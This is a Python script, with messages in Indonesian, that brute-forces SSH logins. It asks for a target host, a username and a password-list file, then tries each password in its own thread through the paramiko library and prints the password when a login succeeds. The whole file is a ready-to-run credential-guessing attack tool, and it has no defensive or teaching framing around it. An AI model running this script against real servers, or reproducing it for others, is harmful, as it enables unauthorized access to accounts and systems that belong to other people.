import paramiko, sys, os, socket, termcolor, threading, time


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('File tidak di temukan !')
    sys.exit(1)
    
stop_flag = 0
def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('Password Ditemukan : ' + password + ', Dari Account: ' + username), 'green'))
    except :
        print(termcolor.colored(('Gagal Login: ' + password), 'red'))


    ssh.close()
    
print('* * * Bruteforce ssh ' + host + ' Account: ' + username + ' * * *')


with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(1)